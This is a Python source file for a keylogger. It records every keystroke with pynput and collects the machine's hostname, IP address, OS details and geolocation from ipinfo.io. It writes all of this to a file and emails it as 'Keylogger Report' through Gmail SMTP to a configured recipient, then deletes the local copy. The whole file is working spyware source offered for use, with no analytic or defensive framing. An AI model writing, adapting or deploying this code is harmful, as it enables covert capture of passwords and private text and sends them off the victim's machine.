# Import required modules
from pynput.keyboard import Key, Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import datetime
import socket
import platform
import requests
import os  # Required for file handling

# Initialize variables
keys = []

# Function to get computer information
def get_computer_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        system = platform.system()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        processor = platform.processor()

        computer_info = (
            f"Hostname: {hostname}\n"
            f"IP Address: {ip_address}\n"
            f"Operating System: {system} {release}\n"
            f"OS Version: {version}\n"
            f"Machine: {machine}\n"
            f"Processor: {processor}\n"
        )
        return computer_info
    except Exception as e:
        return f"Could not retrieve computer info: {e}"

# Function to get geolocation details
def get_geo_location():
    try:
        response = requests.get("https://ipinfo.io/json", timeout=5)
        if response.status_code == 200:
            data = response.json()
            location = (
                f"IP Address: {data.get('ip')}\n"
                f"City: {data.get('city')}\n"
                f"Region: {data.get('region')}\n"
                f"Country: {data.get('country')}\n"
                f"Location (Lat, Long): {data.get('loc')}\n"
                f"Organization: {data.get('org')}\n"
            )
            return location
        else:
            return "Failed to get geo-location data."
    except Exception as e:
        return f"Error retrieving geo-location: {e}"

# Function to send the log via email
def send_log(log_data):
    sender_email = "example@gmail.com" # Replace with the sender email
    # Use an app-specific password for Gmail accounts with 2FA enabled
    sender_password = "slkkejkalkjelfklsa"  # Replace with your actual app-specific password
    recipient_email = "example2@gmail.com"  # Replace with recipient email
    now = datetime.datetime.now()
    subject = f"Keylogger Report - {now.strftime('%Y-%m-%d %H:%M:%S')}"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject

    # Fetch system and location information
    computer_info = get_computer_info()
    geo_info = get_geo_location()

    # Email body
    body = f"""
    <html>
    <body>
    <h2>Keylogger Report</h2>
    <p>Please find the keylogs attached.</p>
    <h3>Computer Information</h3>
    <pre>{computer_info}</pre>
    <h3>Geolocation Information</h3>
    <pre>{geo_info}</pre>
    </body>
    </html>
    """
    msg.attach(MIMEText(body, "html"))

    # Combine logs, system info, and geolocation into a single text file
    log_file_path = "log.txt"
    with open(log_file_path, "w") as log_file:
        log_file.write("=== Keylogger Data ===\n")
        log_file.write(log_data + "\n\n")
        log_file.write("=== Computer Information ===\n")
        log_file.write(computer_info + "\n\n")
        log_file.write("=== Geolocation Information ===\n")
        log_file.write(geo_info + "\n")

    with open(log_file_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename=log.txt")
        msg.attach(part)

    try:
        # Connect to SMTP server with debugging enabled
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.set_debuglevel(1)  # Enable debug output
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
        print("Log data sent successfully!")
        os.remove(log_file_path)
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to handle key press events
def on_press(key):
    global keys
    keys.append(key)
    print(f"{key} pressed")

# Function to format keys
def format_keys(keys):
    log_parts = []
    for key in keys:
        k = str(key).replace("'", "")
        if "space" in k:
            log_parts.append(' ')
        elif "enter" in k:
            log_parts.append('[ENTER]')
        elif "backspace" in k:
            if log_parts:  # Remove the last logged key if there's one
                log_parts.pop()
        elif "Key" in k:
            log_parts.append(f"[{k.upper()}]")
        else:
            log_parts.append(k)
    return ''.join(log_parts)

# Function to handle key release events
def on_release(key):
    global keys
    if key == Key.esc:
        if keys:
            log_data = format_keys(keys)
            send_log(log_data)
        return False

# Start the keyboard listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
